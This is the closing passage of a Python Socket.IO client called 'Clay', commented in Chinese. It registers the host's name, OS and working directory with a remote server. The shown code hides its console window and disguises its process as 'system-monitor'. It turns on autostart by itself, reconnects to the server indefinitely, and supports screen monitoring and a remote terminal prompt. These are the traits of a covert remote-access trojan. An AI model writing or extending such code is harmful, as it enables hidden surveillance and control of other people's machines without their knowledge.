def update_terminal_prompt():
    """更新终端提示符显示当前目录"""
    global current_working_directory
    dir_name = os.path.basename(current_working_directory) or current_working_directory

    sio.emit('terminal_prompt_update', {
        'prompt': f"{dir_name}",
        'full_path': current_working_directory
    })


def register_client():
    """向服务器注册客户端"""
    global current_working_directory

    hostname, os_info = get_system_info()
    client_data = {
        'hostname': hostname,
        'os': os_info,
        'current_directory': current_working_directory,
        'supports_screen': True,
        'client_id': sio.sid
    }

    print(f"注册客户端: {client_data}")
    sio.emit('register_client', client_data)
    update_terminal_prompt()


# --- 主程序 ---
if __name__ == '__main__':
    if HIDE_PROCESS:
        hide_console_window()
        set_process_name("system-monitor")
        # run_in_background()  # 按需开启

    print("Clay 客户端启动...")

    # 检查并设置默认自启动
    print("检查并设置默认自启动...")
    status, msg = check_autostart_status()
    if not status:
        print(f"当前未开启自启动，尝试开启...")
        success, message = set_autostart(True)
        if success:
            print(f"默认自启动已开启: {message}")
        else:
            print(f"开启默认自启动失败: {message}")
    else:
        print(f"自启动已开启: {msg}")

    print(f"尝试连接到服务器: {SERVER_URL}")

    try:
        sio.connect(SERVER_URL, headers={'Client-Type': 'clay-client'}, transports=['websocket'])
        sio.wait()
    except socketio.exceptions.ConnectionError as e:
        print(f"初始连接失败: {e}")
        print("程序将在后台尝试重新连接...")
        while True:
            time.sleep(60)
            if sio.connected:
                print("重新连接成功！")
                sio.wait()
            else:
                print("仍在尝试连接...")

    except KeyboardInterrupt:
        print("收到退出信号...")
        if screen_monitoring:
            stop_screen_monitoring()
    finally:
        print("正在断开连接并清理...")
        stop_heartbeat_thread()
        if screen_monitoring:
            stop_screen_monitoring()
        if sio.connected:
            sio.disconnect()
        print("Clay 客户端已退出。")